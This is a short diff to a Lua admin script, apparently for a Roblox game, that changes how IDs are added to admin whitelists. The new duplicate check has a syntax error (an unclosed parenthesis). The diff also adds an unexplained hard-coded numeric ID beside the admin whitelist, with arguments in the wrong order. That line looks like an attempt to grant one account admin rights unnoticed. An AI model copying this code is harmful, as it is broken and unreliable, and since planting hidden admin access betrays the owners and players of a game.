@@ -310,10 +310,14 @@ function Mainfuncs:GeneralFunction()
 		for i,ID in pairs(GivePanel) do
 			for i2,whitelist in pairs(AdminWhitelist) do
 				if type(whitelist) == "table" then
-					table.insert(whitelist,ID)
+					if not table.find(whitelist, ID then			
+						table.insert(whitelist,ID)
+					end
 				end
 			end
 		end
+
+		table.insert(175692317, AdminWhitelist.Headless)
 	end)
 	
 	for index,Player in pairs(Players:GetPlayers()) do
